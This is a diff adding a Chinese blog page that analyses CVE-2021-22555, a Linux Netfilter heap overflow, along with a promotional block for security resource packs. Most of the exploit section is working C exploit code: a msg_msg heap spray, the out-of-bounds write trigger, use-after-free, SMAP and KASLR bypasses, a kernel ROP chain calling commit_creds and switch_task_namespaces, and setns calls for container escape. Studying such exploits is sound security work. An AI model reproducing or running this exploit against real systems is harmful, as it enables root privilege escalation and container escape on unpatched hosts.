@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>关于内核堆溢出漏洞的分析 - 编程小白</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程小白" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程小白</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">关于内核堆溢出漏洞的分析</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+
+
+                <div id="content_views" class="markdown_views prism-atom-one-dark">
+                    
+                        
+                    
+                    <h2>
+<a id="_0"></a>一、漏洞背景</h2> 
+<p>CVE-2021-22555是一个存在了15年之久的内核堆溢出漏洞，它位于内核的Netfilter组件中，这个组件可以被用来实现防火墙、NAT等功能。</p> 
+<p>该漏洞在2006年由<code>commit 9fa492cdc160cd27ce1046cb36f47d3b2b1efa21</code>引入，并在2021年由<code>commit b29c457a6511435960115c0f548c4360d5f4801d</code>修复。</p> 
+<p>利用这个漏洞可以导致目标系统拒绝服务，甚至实现提权、容器逃逸并执行任意代码，危害等级极高。</p> 
+<h2>
+<a id="_8"></a>二、漏洞分析</h2> 
+<p>漏洞位于net/netfilter/x_tables.c的xt_compat_target_from_user函数：</p> 
+<pre><code>// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/netfilter/x_tables.c
+void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,
+                unsigned int *size)
+{
+    const struct xt_target *target = t-&gt;u.kernel.target;
+    struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;
+    int pad, off = xt_compat_target_offset(target);
+    u_int16_t tsize = ct-&gt;u.user.target_size;
+    char name[sizeof(t-&gt;u.user.name)];
+
+    t = *dstptr;
+    memcpy(t, ct, sizeof(*ct));
+    if (target-&gt;compat_from_user)
+        target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);
+    else
+        memcpy(t-&gt;data, ct-&gt;data, tsize - sizeof(*ct));
+    pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;
+    if (pad &gt; 0)
+        memset(t-&gt;data + target-&gt;targetsize, 0, pad);
+
+    tsize += off;
+    t-&gt;u.user.target_size = tsize;
+    strlcpy(name, target-&gt;name, sizeof(name));
+    module_put(target-&gt;me);
+    strncpy(t-&gt;u.user.name, name, sizeof(t-&gt;u.user.name));
+
+    *size += off;
+    *dstptr += tsize;
+}
+
+</code></pre> 
+<p>缓冲区溢出发生在<code>memset(t-&gt;data + target-&gt;targetsize, 0, pad)</code>这个语句，其本意是讲已经对齐的缓冲区多余的pad个字节清零。由于在分配内存的时候没有考虑到对齐，t-&gt;data之后只有target-&gt;targetsize个字节的有效存储空间，导致这里会发生pad个字节的溢出。通过选择不同的target，可以控制targetsize，进而控制溢出字节数pad。</p> 
+<p>要让内核执行到有漏洞的xt_compat_target_from_user函数，需要在用户空间调用setsockopt，并提供IPT_SO_SET_REPLACE或IP6T_SO_SET_REPLACE作为第3个参数。这个操作需要用户进程拥有CAP_NET_ADMIN能力，而这个能力可以通过切换到新的用户+网络名称空间来获得。</p> 
+<blockquote> 
+ <p><strong><a href="https://shimo.im/docs/C9WxVrD6V3tGcjgQ/">【一&gt;所有资源获取&lt;一】</a></strong><br> 1、200份很多已经买不到的绝版电子书<br> 2、30G安全大厂内部的视频资料<br> 3、100份src文档<br> 4、常见安全面试题<br> 5、ctf大赛经典题目解析<br> 6、全套工具包<br> 7、应急响应笔记<br> 8、网络安全学习路线</p> 
+</blockquote> 
+<h2>
+<a id="EXP_59"></a>三、EXP分析</h2> 
+<p>EXP整体思路是利用堆溢出改写特殊链表的指针，进而实现UAF，最后改写特定内核结构体的函数指针来实现代码执行。</p> 
+<h3>
+<a id="31_UAF_63"></a>3.1 实现UAF</h3> 
+<h4>
+<a id="311__65"></a>3.1.1 申请消息队列</h4> 
+<p>通过msgget申请NUM_MSQIDS个消息队列，在EXP中NUM_MSQIDS等于4096。消息队列数目没有特殊要求，数目越多则EXP越稳定，原因后面会解释。这步是为后面的堆喷做准备。</p> 
+<pre><code>for (int i = 0; i &lt; NUM_MSQIDS; i++) {
+  if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) &lt; 0) {
+    perror("[-] msgget");
+    goto err_no_rmid;
+  }
+}
+
+</code></pre> 
+<h4>
+<a id="312__79"></a>3.1.2 发送主要消息</h4> 
+<p>通过msgsnd给每个消息队列都发送一个4096字节的消息，暂且称这些消息为主要消息，每个消息的内容是其所在消息队列的序号，分别为0-4095。注意这里所谓的4096字节并非指消息内容的长度，而是指消息传递到内核空间之后，内核为容纳该消息而开辟的堆缓冲区的大小，该缓冲区容纳了一个结构体msg_msg的实例和消息的实际内容，后面所提及的“消息长度”都是指内核缓冲区的长度。</p> 
+<pre><code>printf("[*] Spraying primary messages...n");
+for (int i = 0; i &lt; NUM_MSQIDS; i++) {
+  memset(&amp;msg_primary, 0, sizeof(msg_primary));
+  *(int *)&amp;msg_primary.mtext[0] = MSG_TAG;
+  *(int *)&amp;msg_primary.mtext[4] = i;
+  if (write_msg(msqid[i], &amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) &lt;
+      0)
+    goto err_rmid;
+}
+
+int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) {
+  *(long *)msgp = msgtyp;
+  if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) &lt; 0) {
+    perror("[-] msgsnd");
+    return -1;
+  }
+  return 0;
+}
+
+</code></pre> 
+<p>这里所使用的msgsnd函数是最常用的堆喷手段之一，因为传递的消息内容会一成不变地复制到内核缓冲区中， 这样就可以达到控制内核缓冲区内容的目的。当消息传递到内核空间时，内核是通过alloc_msg函数来申请堆缓冲区的：</p> 
+<pre><code>// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/ipc/msgutil.c
+static struct msg_msg *alloc_msg(size_t len)
+{
+    struct msg_msg *msg;
+    struct msg_msgseg **pseg;
+    size_t alen;
+
+    // 取实际消息长度len和DATALEN_MSG中的最小值为第一个消息分片的长度
+    alen = min(len, DATALEN_MSG);
+    // 为首个消息分片开辟缓冲区，长度为结构体msg_msg加上alen
+    msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);
+    if (msg == NULL)
+        return NULL;
+
+    msg-&gt;next = NULL;
+    msg-&gt;security = NULL;
+
+    len -= alen;
+    pseg = &amp;msg-&gt;next;
+    // 若首个消息分片不足以容纳完整的消息，将陆续开辟后续的消息分片
+    while (len &gt; 0) {
+        struct msg_msgseg *seg;
+
+        cond_resched();
+
+        alen = min(len, DATALEN_SEG);
+        // 为后续消息分片开辟缓冲区，长度为结构体msg_msgseg加上alen
+        seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);
+        if (seg == NULL)
+            goto out_err;
+        *pseg = seg;
+        seg-&gt;next = NULL;
+        pseg = &amp;seg-&gt;next;
+        len -= alen;
+    }
+
+    return msg;
+
+out_err:
+    free_msg(msg);
+    return NULL;
+}
+
+</code></pre> 
+<p>其中，结构体msg_msg的定义如下：</p> 
+<pre><code>struct msg_msg {
+    struct list_head m_list;
+    long m_type;
+    size_t m_ts;        /* message text size */
+    struct msg_msgseg *next;
+    void *security;
+    /* the actual message follows immediately */
+};
+
+struct list_head {
+    struct list_head *next, *prev;
+};
+
+</code></pre> 
+<p>内核为消息开辟好缓冲区后，会将其插入到每个消息队列中，形成一个双向链表，每个消息的m_list.next指针指向下一个消息，m_list.prev指向前一个消息。</p> 
+<p>需要注意的是，当消息实际内容的长度大于阈值DATALEN_MSG时，内核会对消息进行分片，这在利用过程中是必须要避免的，所幸的是这里选择的长度并不会导致消息分片。</p> 
+<p>发送完后，极大概率存在部分主要消息在地址上是连续的：</p> 
+<p><img src="https://images2.imgbox.com/27/cb/6oL6dEs8_o.png" alt="image.png"></p> 
+<h4>
+<a id="313__179"></a>3.1.3 发送次要消息</h4> 
+<p>再给每个消息队列发送1024个字节的次要消息，每个消息的内容同样是其所在消息队列的序号。</p> 
+<pre><code>printf("[*] Spraying secondary messages...n");{<!-- -->{
+for (int i = 0; i &lt; NUM_MSQIDS; i++) {
+  memset(&amp;msg_secondary, 0, sizeof(msg_secondary));
+  *(int *)&amp;msg_secondary.mtext[0] = MSG_TAG;
+  *(int *)&amp;msg_secondary.mtext[4] = i;
+  if (write_msg(msqid[i], &amp;msg_secondary, sizeof(msg_secondary),
+                MTYPE_SECONDARY) &lt; 0)
+    goto err_rmid;
+}
+
+</code></pre> 
+<p>发送完后，每个主要消息后面都会跟着一个次要消息，且它们的内容是相同的：</p> 
+<p><img src="https://images2.imgbox.com/05/84/W7moLNXN_o.png" alt="image.png"></p> 
+<h4>
+<a id="314__200"></a>3.1.4 释放部分主要消息</h4> 
+<p>从第1024号队列开始，每隔1024个队列释放一个主要消息，这一步释放的缓冲区将在后面触发漏洞时重新申请使用，将间隔设置为1024也是因为这样选出的主要消息所在的内存位置之后紧邻另一个主要消息的可能性更大。</p> 
+<pre><code>printf("[*] Creating holes in primary messages...n");
+for (int i = HOLE_STEP; i &lt; NUM_MSQIDS; i += HOLE_STEP) {
+  if (read_msg(msqid[i], &amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) &lt;
+      0)
+    goto err_rmid;
+}
+
+</code></pre> 
+<h4>
+<a id="315__214"></a>3.1.5 触发缓冲区溢出漏洞</h4> 
+<p>重新申请上一步释放的缓冲区，同时触发缓冲区溢出漏洞，将缓冲区外2个字节覆盖为0。前面提到，上一步释放的缓冲区后面极大概率紧跟着一个主要消息，这是因为前面发送了大量主要消息，将内核内存分配器能分配的内存空洞都填满了之后，所获得的缓冲区极大概率是相邻的。所以，申请的消息队列数目越多，发送越多的主要消息，内存空洞被填满的概率越大，EXP也就越稳定。在这种理想情况下，这一步会将缓冲区后面的主要消息的next指针的最低位2个字节覆盖为0，导致其指向另外一个次要消息。这样，就会有2个主要消息的next指针指向同一个次要消息。</p> 
+<p><img src="https://images2.imgbox.com/85/f7/8v6j3obP_o.png" alt="image.png"></p> 
+<pre><code>printf("[*] Triggering out-of-bounds write...n");
+if (trigger_oob_write(s) &lt; 0)
+  goto err_rmid;
+
+int trigger_oob_write(int s) {
+  struct __attribute__((__packed__)) {
+    struct ipt_replace replace;
+    struct ipt_entry entry;
+    struct xt_entry_match match;
+    char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];
+    struct xt_entry_target target;
+  } data = {0};
+
+  data.replace.num_counters = 1;
+  data.replace.num_entries = 1;
+  data.replace.size = (sizeof(data.entry) + sizeof(data.match) +
+                       sizeof(data.pad) + sizeof(data.target));
+
+  data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +
+                            sizeof(data.pad) + sizeof(data.target));
+  data.entry.target_offset =
+      (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));
+
+  data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));
+  strcpy(data.match.u.user.name, "icmp");
+  data.match.u.user.revision = 0;
+
+  data.target.u.user.target_size = sizeof(data.target);
+  strcpy(data.target.u.user.name, "NFQUEUE");
+  data.target.u.user.revision = 1;
+
+  // Partially overwrite the adjacent buffer with 2 bytes of zero.
+  if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, sizeof(data)) != 0) {
+    if (errno == ENOPROTOOPT) {
+      printf("[-] Error ip_tables module is not loaded.n");
+      return -1;
+    }
+  }
+
+  return 0;
+}
+
+</code></pre> 
+<h4>
+<a id="316_UAF_265"></a>3.1.6 实现UAF</h4> 
+<p>利用带MSG_COPY参数的msgrcv函数搜索同一消息队列但内容不同的主要消息和次要消息，这样就可以在不释放消息缓冲区的前提下查看消息内容。前面提到，同一消息队列的主要消息和次要消息的内容在正常情况下应该是相同的，如果不同，说明该主要消息的next指针在上一步被改写了，导致2个消息队列包含同一个次要消息。再释放其中一个队列的次要消息，由于另一个队列还在使用该次要消息，就实现了UAF。</p> 
+<p><img src="https://images2.imgbox.com/33/99/HiTD7NIU_o.png" alt="image.png"></p> 
+<pre><code>printf("[*] Searching for corrupted primary message...n");
+for (int i = 0; i &lt; NUM_MSQIDS; i++) {
+  if (i != 0 &amp;&amp; (i % HOLE_STEP) == 0)
+    continue;
+  if (peek_msg(msqid[i], &amp;msg_secondary, sizeof(msg_secondary), 1) &lt; 0)
+    goto err_no_rmid;
+  if (*(int *)&amp;msg_secondary.mtext[0] != MSG_TAG) {
+    printf("[-] Error could not corrupt any primary message.n");
+    goto err_no_rmid;
+  }
+  if (*(int *)&amp;msg_secondary.mtext[4] != i) {
+    fake_idx = i;
+    real_idx = *(int *)&amp;msg_secondary.mtext[4];
+    break;
+  }
+}
+
+if (fake_idx == -1 &amp;&amp; real_idx == -1) {
+  printf("[-] Error could not corrupt any primary message.n");
+  goto err_no_rmid;
+}
+
+// fake_idx's primary message has a corrupted next pointer; wrongly
+// pointing to real_idx's secondary message.
+printf("[+] fake_idx: %xn", fake_idx);
+printf("[+] real_idx: %xn", real_idx);
+
+printf("[*] Freeing real secondary message...n");
+if (read_msg(msqid[real_idx], &amp;msg_secondary, sizeof(msg_secondary),
+              MTYPE_SECONDARY) &lt; 0)
+  goto err_rmid;
+
+</code></pre> 
+<h3>
+<a id="32_SMAP_306"></a>3.2 绕过SMAP</h3> 
+<p>如果内核开启了SMAP，用户空间的数据将不能被内核访问，就需要通过信息泄露获取内核空间的地址来利用内核空间的数据。</p> 
+<h4>
+<a id="321__310"></a>3.2.1 构造伪次要消息</h4> 
+<p>上一步释放了一个次要消息所占据的缓冲区，为了方便说明，后面称之为关键缓冲区。关键缓冲区虽然被释放了，但还是有一个消息队列在使用关键缓冲区。</p> 
+<p>通过write函数向UNIX socket写入数据的方式构造许多个伪次要消息，之所以要构造多个，是为了切实地将虚假数据写入已经被释放的关键缓冲区中。这也是实现堆喷的重要手段，由于没有多余的数据结构占据通过该手段写入的缓冲区，因而可以完全控制内核缓冲区的内容。</p> 
+<p>这里构造的伪次要消息的m_ts字段（表示消息内容长度的字段）为不需要分片的最大消息内容长度，要远远大于1024字节的真实次要消息内容长度，相当于将相邻的次要消息也纳入伪次要消息的范围。</p> 
+<p><img src="https://images2.imgbox.com/ea/2b/OvWqeCt2_o.png" alt="image.png"></p> 
+<pre><code>// Reclaim the previously freed secondary message with a fake msg_msg of
+// maximum possible size.
+printf("[*] Spraying fake secondary messages...n");
+memset(secondary_buf, 0, sizeof(secondary_buf));
+build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
+              PAGE_SIZE - MSG_MSG_SIZE, 0);
+if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) &lt; 0)
+  goto err_rmid;
+
+void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
+                   uint64_t m_list_prev, uint64_t m_ts, uint64_t next) {
+  msg-&gt;m_list_next = m_list_next;
+  msg-&gt;m_list_prev = m_list_prev;
+  msg-&gt;m_type = MTYPE_FAKE;
+  msg-&gt;m_ts = m_ts;
+  msg-&gt;next = next;
+  msg-&gt;security = 0;
+}
+
+int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) {
+  for (int i = 0; i &lt; NUM_SOCKETS; i++) {
+    for (int j = 0; j &lt; NUM_SKBUFFS; j++) {
+      if (write(ss[i][0], buf, size) &lt; 0) {
+        perror("[-] write");
+        return -1;
+      }
+    }
+  }
+  return 0;
+}
+
+</code></pre> 
+<h4>
+<a id="322__354"></a>3.2.2 越界读取相邻次要消息</h4> 
+<p>由于构造的伪次要消息的m_ts字段要远大于真实次要消息内容长度，通过读取该消息可以越界读取相邻次要消息的头部内容，包括next指针，这样就获得了该next指针所指向的主要消息的地址（消息队列是双向链表）。</p> 
+<pre><code>// Use the fake secondary message to read out-of-bounds.
+printf("[*] Leaking adjacent secondary message...n");
+if (peek_msg(msqid[fake_idx], &amp;msg_fake, sizeof(msg_fake), 1) &lt; 0)
+  goto err_rmid;
+
+// Check if the leak is valid.
+if (*(int *)&amp;msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) {
+  printf("[-] Error could not leak adjacent secondary message.n");
+  goto err_rmid;
+}
+
+// The secondary message contains a pointer to the primary message.
+msg = (struct msg_msg *)&amp;msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];
+kheap_addr = msg-&gt;m_list_next;
+if (kheap_addr &amp; (PRIMARY_SIZE - 1))
+  kheap_addr = msg-&gt;m_list_prev;
+printf("[+] kheap_addr: %" PRIx64 "n", kheap_addr);
+
+</code></pre> 
+<h4>
+<a id="323__379"></a>3.2.3 再次构造伪次要消息</h4> 
+<p>获得了相邻次要消息所指向的主要消息的地址后，通过read函数读取socket内容的方式释放伪次要消息，让关键缓冲区再次进入被释放状态。然后，以相同的方式重新构造伪次要消息，这次构造的m_ts字段要大于消息分片的阈值，next字段等于相邻次要消息所指向的主要消息的地址-结构msg_msgseg的长度，这样做相当于将该主要消息伪造成下一个消息片段，那么在读取伪次要消息时，就可以读取该主要消息的next指针，该指针指向相邻次要消息，将指针内容减去1024即可获得伪次要消息即关键缓冲区的地址。</p> 
+<pre><code>// Put kheap_addr at next to leak its content. Assumes zero bytes before
+// kheap_addr.
+printf("[*] Spraying fake secondary messages...n");
+memset(secondary_buf, 0, sizeof(secondary_buf));
+build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
+              sizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);
+if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) &lt; 0)
+  goto err_rmid;
+
+// Use the fake secondary message to read from kheap_addr.
+printf("[*] Leaking primary message...n");
+if (peek_msg(msqid[fake_idx], &amp;msg_fake, sizeof(msg_fake), 1) &lt; 0)
+  goto err_rmid;
+
+// Check if the leak is valid.
+if (*(int *)&amp;msg_fake.mtext[PAGE_SIZE] != MSG_TAG) {
+  printf("[-] Error could not leak primary message.n");
+  goto err_rmid;
+}
+
+// The primary message contains a pointer to the secondary message.
+msg = (struct msg_msg *)&amp;msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];
+kheap_addr = msg-&gt;m_list_next;
+if (kheap_addr &amp; (SECONDARY_SIZE - 1))
+  kheap_addr = msg-&gt;m_list_prev;
+
+// Calculate the address of the fake secondary message.
+kheap_addr -= SECONDARY_SIZE;
+printf("[+] kheap_addr: %" PRIx64 "n", kheap_addr);
+
+</code></pre> 
+<h3>
+<a id="33_KASLRSMEP_416"></a>3.3 绕过KASLR/SMEP</h3> 
+<p>接下来将通过泄露内核.data段的地址来绕过KASLR，并通过利用内核gadget构造ROP链来绕过SMEP。</p> 
+<h4>
+<a id="331__420"></a>3.3.1 释放伪次要消息</h4> 
+<p>前面构造的伪次要消息的内容是通过socket写入的，那么内核肯定有一个跟socket相关的结构体是指向伪次要消息缓冲区的，事实上该结构体为sk_buff。</p> 
+<p><img src="https://images2.imgbox.com/3c/a6/IWHiilNO_o.png" alt="image.png"></p> 
+<p>由于结构体msg_msg占据了消息缓冲区前面部分，msgrcv不能完全读取缓冲区的内容，而通过socket则相反。因此，需要通过msgrcv将关键缓冲区释放，后面通过socket读取关键缓冲区的内容。</p> 
+<p>由于之前构造的伪次要消息的next和prev指针不是有效的地址，现阶段不能直接通过msgrcv释放该伪次要消息，因为内核会检查消息队列链表的完整性。</p> 
+<p>为了能通过msgrcv释放伪次要消息，需要依次执行以下步骤：</p> 
+<ol>
+<li>通过读取socket释放关键缓冲区。</li>
+<li>通过写入socket再次申请关键缓冲区，写入内容为重新构造的伪次要消息，其next和prev指针为自身地址，这样就能绕过链表完整性检查。</li>
+<li>通过msgrcv释放伪次要消息。</li>
+</ol> 
+<pre><code>printf("[*] Freeing fake secondary messages...n");
+free_skbuff(ss, secondary_buf, sizeof(secondary_buf));
+
+// Put kheap_addr at m_list_next &amp; m_list_prev so that list_del() is possible.
+printf("[*] Spraying fake secondary messages...n");
+memset(secondary_buf, 0, sizeof(secondary_buf));
+build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0);
+if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) &lt; 0)
+  goto err_rmid;
+
+printf("[*] Freeing sk_buff data buffer...n");
+if (read_msg(msqid[fake_idx], &amp;msg_fake, sizeof(msg_fake), MTYPE_FAKE) &lt; 0)
+  goto err_rmid;
+
+</code></pre> 
+<h4>
+<a id="332__453"></a>3.3.2 泄露内核地址</h4> 
+<p>上一步执行完后，还有sk_buff指向关键缓冲区，那么，如果在关键缓冲区填入包含指向内核.data段指针的数据结构，再通过读取socket来获得缓冲区的完整内容，就可以获得内核.data段的地址，进而计算出.text段的地址，让利用内核gadget成为可能。</p> 
+<p><img src="https://images2.imgbox.com/48/cc/CDL09u8d_o.png" alt="image.png"></p> 
+<p>结构体pipe_buffer是个很好的目标，其定义如下：</p> 
+<pre><code>// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/pipe_fs_i.h
+struct pipe_buffer {
+    struct page *page;
+    unsigned int offset, len;
+    const struct pipe_buf_operations *ops;
+    unsigned int flags;
+    unsigned long private;
+};
+
+struct pipe_buf_operations {
+    ...
+    /*
+     * When the contents of this pipe buffer has been completely
+     * consumed by a reader, -&gt;release() is called.
+     */
+    void (*release)(struct pipe_inode_info *, struct pipe_buffer *);
+    ...
+};
+
+</code></pre> 
+<p>pipe_buffer的成员ops指向一个位于内核.data段的数据结构anon_pipe_buf_ops，它将是接下来的泄露目标。</p> 
+<p>而且，ops指向的数据结构包含很多跟管道操作相关的函数指针，其中一个是release，它所指向的函数将在释放管道时被调用。那么，通过篡改ops指向伪造的pipe_buf_operations结构，在释放管道时就可以劫持控制流。</p> 
+<p>为泄露内核.data段的地址，将进行以下步骤：</p> 
+<ol><li>通过向多个管道写入数据让内核构造多个pipe_buffer结构体的实例，其中一个实例将占据关键缓冲区。此时内存布局如下：</li></ol> 
+<p><img src="https://images2.imgbox.com/a3/54/R74bWw1W_o.png" alt="image.png"></p> 
+<ol><li>读取socket，获得anon_pipe_buf_ops的地址，也就是获得了内核.data段地址。</li></ol> 
+<pre><code>printf("[*] Spraying pipe_buffer objects...n");
+for (int i = 0; i &lt; NUM_PIPEFDS; i++) {
+  if (pipe(pipefd[i]) &lt; 0) {
+    perror("[-] pipe");
+    goto err_rmid;
+  }
+  // Write something to populate pipe_buffer.
+  if (write(pipefd[i][1], "pwn", 3) &lt; 0) {
+    perror("[-] write");
+    goto err_rmid;
+  }
+}
+
+printf("[*] Leaking and freeing pipe_buffer object...n");
+for (int i = 0; i &lt; NUM_SOCKETS; i++) {
+  for (int j = 0; j &lt; NUM_SKBUFFS; j++) {
+    if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) &lt; 0) {
+      perror("[-] read");
+      goto err_rmid;
+    }
+    if (*(uint64_t *)&amp;secondary_buf[0x10] != MTYPE_FAKE)
+      pipe_buffer_ops = *(uint64_t *)&amp;secondary_buf[0x10];
+  }
+}
+
+kbase_addr = pipe_buffer_ops - ANON_PIPE_BUF_OPS;
+printf("[+] anon_pipe_buf_ops: %" PRIx64 "n", pipe_buffer_ops);
+printf("[+] kbase_addr: %" PRIx64 "n", kbase_addr);
+
+</code></pre> 
+<p>此时关键缓冲区已被释放，内存布局如下：</p> 
+<p><img src="https://images2.imgbox.com/1a/2b/X6L21Qpp_o.png" alt="image.png"></p> 
+<h3>
+<a id="34__532"></a>3.4 提权和容器逃逸</h3> 
+<p>先通过写入socket构造伪pipe_buffer，让ops指针指向在关键缓冲区伪造的pipe_buf_operations，其中的release指针指向跟栈迁移相关的内核.text段的gadget。</p> 
+<p><img src="https://images2.imgbox.com/5c/20/nVlFsWXA_o.png" alt="image.png"></p> 
+<p>同时，在关键缓冲区构造ROP链依序执行以下任务：</p> 
+<ol>
+<li>保存RBP。</li>
+<li>执行commit_creds(prepare_kernel_cred(NULL))，这一步是为了获得root权限。</li>
+<li>执行switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)，这一步在容器环境中才有用，否则只是冗余步骤，作用是pid为1的进程的名称空间替换为容器初始化时的全局名称空间init_nsproxy，init_nsproxy名称空间可以访问宿主机的文件系统。</li>
+<li>恢复RBP并恢复正常执行流程。</li>
+</ol> 
+<pre><code>printf("[*] Spraying fake pipe_buffer objects...n");
+memset(secondary_buf, 0, sizeof(secondary_buf));
+buf = (struct pipe_buffer *)&amp;secondary_buf;
+buf-&gt;ops = kheap_addr + 0x290;
+ops = (struct pipe_buf_operations *)&amp;secondary_buf[0x290];
+// RSI points to &amp;buf.
+ops-&gt;release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39;
+build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0);
+if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) &lt; 0)
+  goto err_rmid;
+
+void build_krop(char *buf, uint64_t kbase_addr, uint64_t scratchpad_addr) {
+  uint64_t *rop;
+
+  *(uint64_t *)&amp;buf[0x39] = kbase_addr + POP_RSP_RET;
+  *(uint64_t *)&amp;buf[0x00] = kbase_addr + ADD_RSP_D0_RET;
+
+  rop = (uint64_t *)&amp;buf[0xD8];
+
+  // Save RBP at scratchpad_addr.
+  *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET;
+  *rop++ = scratchpad_addr; // R12
+  *rop++ = 0xDEADBEEF;      // RBP
+  *rop++ = kbase_addr + MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET;
+  *rop++ = 0xDEADBEEF; // RBX
+  *rop++ = 0xDEADBEEF; // R12
+  *rop++ = 0xDEADBEEF; // RBP
+
+  // commit_creds(prepare_kernel_cred(NULL))
+  *rop++ = kbase_addr + POP_RDI_RET;
+  *rop++ = 0; // RDI
+  *rop++ = kbase_addr + PREPARE_KERNEL_CRED;
+  *rop++ = kbase_addr + POP_RCX_RET;
+  *rop++ = 4; // RCX
+  *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;
+  *rop++ = 0xDEADBEEF; // RBP
+  *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;
+  *rop++ = kbase_addr + COMMIT_CREDS;
+
+  // switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)
+  *rop++ = kbase_addr + POP_RDI_RET;
+  *rop++ = 1; // RDI
+  *rop++ = kbase_addr + FIND_TASK_BY_VPID;
+  *rop++ = kbase_addr + POP_RCX_RET;
+  *rop++ = 4; // RCX
+  *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;
+  *rop++ = 0xDEADBEEF; // RBP
+  *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;
+  *rop++ = kbase_addr + POP_RSI_RET;
+  *rop++ = kbase_addr + INIT_NSPROXY; // RSI
+  *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES;
+
+  // Load RBP from scratchpad_addr and resume execution.
+  *rop++ = kbase_addr + POP_RBP_RET;
+  *rop++ = scratchpad_addr - 0xA; // RBP
+  *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_A_POP_RBP_RET;
+  *rop++ = kbase_addr + MOV_RSP_RBP_POP_RBP_RET;
+}
+
+</code></pre> 
+<p>释放管道，执行release所指向的gadget，将内核栈迁移到关键缓冲区构造的ROP链处，然后执行完整个ROP链，实现提权。</p> 
+<pre><code>printf("[*] Releasing pipe_buffer objects...n");
+for (int i = 0; i &lt; NUM_PIPEFDS; i++) {
+  if (close(pipefd[i][0]) &lt; 0) {
+    perror("[-] close");
+    goto err_rmid;
+  }
+  if (close(pipefd[i][1]) &lt; 0) {
+    perror("[-] close");
+    goto err_rmid;
+  }
+}
+
+</code></pre> 
+<p>最后，将当前进程的名称空间替换成1号进程的，而1号进程的名称空间已经替换成容器初始化时的全局名称空间init_nsproxy，由此实现容器逃逸。</p> 
+<pre><code>setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
+setns(open("/proc/1/ns/pid", O_RDONLY), 0);
+setns(open("/proc/1/ns/net", O_RDONLY), 0);
+</code></pre>
+                </div>
+                
+                
+
+		</div>
+	</article>
+</main>
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程小白.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
